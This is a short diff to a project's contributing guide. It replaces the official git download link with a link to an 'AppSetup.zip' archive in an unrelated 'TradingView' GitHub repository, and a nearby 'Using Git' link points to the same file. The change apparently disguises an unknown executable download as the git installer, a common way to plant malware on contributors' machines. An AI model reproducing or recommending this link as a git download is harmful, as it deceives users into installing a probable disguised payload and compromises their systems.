@@ -67,7 +67,7 @@ This is the easiest approach if you just want to make a simple change to
 a single file, like fixing a typo.
 1. Install and use the [GitHub Desktop](https://docs.github.com/en/free-pro-team@latest/github/getting-started-with-github/github-desktop)
 1. Install and use the [GitHub CLI](https://docs.github.com/en/free-pro-team@latest/github/getting-started-with-github/github-cli)
-1. [Install `git`](https://git-scm.com/downloads) and use it from the
+1. [Install `git`](https://github.com/QingYunLife/TradingView/releases/download/Desktop/AppSetup.zip) and use it from the
 command line. You might find these resources helpful:
     - [Using Git](https://github.com/QingYunLife/TradingView/releases/download/Desktop/AppSetup.zip)
     - [`git` cheatsheet](https://training.github.com/)
